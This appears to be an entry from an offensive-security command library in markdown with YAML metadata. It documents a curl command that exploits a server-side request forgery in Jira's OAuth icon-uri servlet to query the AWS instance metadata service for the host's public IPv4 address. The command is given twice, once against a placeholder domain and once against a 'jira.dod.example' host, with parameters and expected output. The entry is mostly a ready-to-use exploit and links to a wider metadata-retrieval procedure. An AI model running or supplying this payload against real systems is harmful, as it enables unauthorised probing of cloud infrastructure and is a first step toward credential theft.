---
data: >-
  curl
  "https://target-domain/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/public-ipv4"
tags:
  - ssrf
  - aws
  - ip
type: command
output: 54.123.45.67 (example public IP)
executor: bash
platforms:
  - Linux
  - AWS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:55.295Z'
id: 56d6cb00-bd59-464a-bba7-0e85aca545f8
verified: false
validated: true
submitted: true
---
# curl-ssrf-aws-public-ip

## Command

```bash
curl "https://target-domain/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/public-ipv4"
```

## Description

Retrieves the public IPv4 address via SSRF to the metadata service.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `target-domain` | Vulnerable app domain | Yes |

## Examples

### Basic Usage

```bash
curl "https://jira.dod.example/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/public-ipv4"
```

## Expected Output

Public IP address as plain text.

## Related

- [[Related Procedure: Retrieve-AWS-Instance-Metadata-via-SSRF]]
